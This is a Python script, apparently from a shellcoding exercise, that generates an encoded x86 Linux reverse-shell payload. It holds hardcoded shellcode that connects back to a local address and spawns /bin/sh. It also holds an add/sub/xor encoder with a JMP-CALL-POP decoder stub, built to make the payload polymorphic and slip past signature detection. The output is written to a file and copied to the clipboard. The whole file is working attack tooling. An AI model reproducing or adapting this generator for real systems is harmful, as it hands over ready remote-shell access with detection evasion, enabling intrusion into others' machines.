#!/usr/bin/python3
import argparse
import sys
import os
import pyperclip

# Output file to write the final payload you can find the file in the directory where you execute this file
OUTPUT_PATH = os.path.join(os.path.dirname(
    os.path.abspath(__file__)), "encoded_shellcode")


## Definition of every template needed to generate the payload 

# Addition 
def add(byte, number):
    return byte+number

# Substraction
def sub(byte, number):
    return byte-number

# Xor
def xor(byte, number):
    return byte ^ number

# Dictionary used to define which operation to use based on the user input. 
template_operation = {
    'sub': {
        'payload': [0x80, 0x44, 0x0E, 0xFF],
        'calculation': sub
    },
    'add': {
        'payload': [0x80, 0x6C, 0x0E, 0xFF],
        'calculation': add},
    'xor': {
        'payload': [0x80, 0x74, 0x0E, 0xFF],
        'calculation': xor}
}

# Start of the decoder payload and its end. It is static.
template_decoder = {
    'start': [0xEB, 0x11, 0x5E, 0x31, 0xC9, 0xB1],
    'end': [0x80, 0xE9, 0x01, 0x75, 0xF6, 0xEB, 0x05, 0xE8, 0xEA, 0xFF, 0xFF, 0xFF]
}

# Parser 
"""
    Two required arguments : 
    -o define if you want to do a substraction, addition or a xor 
    -n which is the number used by the different operation
"""
def parser():
    parser = argparse.ArgumentParser(
        description='Generate simple reverse shell payload with polymorphism')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument("-o", "--operation", choices=[
                               'xor', 'sub', 'add'], help="Choose what operation you want to do", required=True)
    requiredNamed.add_argument(
        '-n', '--number', type=int, help='number to add/sub/xor (>0)', required=True)
    if len(sys.argv) == 1:
        parser.print_help()
        exit(1)
    return parser.parse_args()

# Writing the final array in a text file
"""
    Write the payload in the OUTPUT_PATH file in the format \\x01. 
    final_array is the concatenation of 2 arrays which are the decoder and the encoded payload.
    Also tries to copy the array in your clipboard.
"""
def write_payload(final_array):
    with open(OUTPUT_PATH, "w") as f:
        final_payload = ''
        for byte in final_array:
            final_payload += '\\x'+format(byte, '02x')
        f.write(final_payload)
    print(f"Final payload={final_payload}\nSize={len(final_array)} bytes")
    try:
        pyperclip.copy(final_payload)
        print("Payload sucessfully copied to your clipboard")
    except Exception as e:
        print(f"Copy in clipboard failed, you can find your payload in {OUTPUT_PATH}\nreason={e}")
    
# Encode the base payload 
"""
    Based on the argument passed by the user, do an operation with the number and return the encoded array.
    Due to the complexity to have a negative number or a number above 255 we exit the program if it happens.
"""
def encoding(payload_array, number, operation):
    encoded_array = []
    for byte in payload_array:
        new_byte = template_operation[operation]['calculation'](byte, number)
        if new_byte < 0 or new_byte >= 256:
            print(f"Number negative or above 255 is forbidden in your payload. [byte={new_byte}] \nExiting...")
            exit(2)
        encoded_array.append(new_byte)
    return encoded_array

"""
    Create the decoder based on the user input
"""
def create_decoder(length_payload, number, operation):
    decoder_start = template_decoder['start']
    decoder_start.append(length_payload)
    template_operation[operation]['payload'].append(number)
    return decoder_start + template_operation[operation]['payload'] + template_decoder['end']


if __name__ == '__main__':
    parser = parser()
    operation = parser.operation
    number = parser.number
    # Negative number as user input makes no sense for us. Just denies it.
    if number <= 0:
        raise argparse.ArgumentTypeError("{} is an invalid positive int value".format(number))
    # Base payload. Basically a reverse shell on your localhost. 
    payload_array = [0x60, 0x6A, 0x66, 0x58, 0x6A, 0x01, 0x5B, 0x31, 0xC9, 0x51, 0x6A, 0x01, 0x6A, 0x02, 0x89, 0xE1, 0xCD, 0x80, 0x89, 0xC7, 0x68, 0x7F, 0x01, 0x01, 0x01, 0x66, 0x68, 0x04, 0xD2, 0x66, 0x6A, 0x02, 0x89, 0xE1, 0x6A, 0x10, 0x51, 0x57, 0x89, 0xE1, 0xB0, 0x66, 0xB3, 0x03, 0xCD, 0x80,
                     0x31, 0xC9, 0xB0, 0x3F, 0x89, 0xFB, 0xCD, 0x80, 0xB0, 0x3F, 0x41, 0xCD, 0x80, 0xB0, 0x3F, 0x41, 0xCD, 0x80, 0xB0, 0x0B, 0x31, 0xDB, 0x53, 0x68, 0x2F, 0x2F, 0x73, 0x68, 0x68, 0x2F, 0x62, 0x69, 0x6E, 0x89, 0xE3, 0x31, 0xC9, 0x31, 0xD2, 0xCD, 0x80,  0x83, 0xC4, 0x30, 0x61]
    decoder = create_decoder(len(payload_array), number, operation)

    encoded_array = encoding(payload_array, number, operation)
    write_payload(decoder+encoded_array)
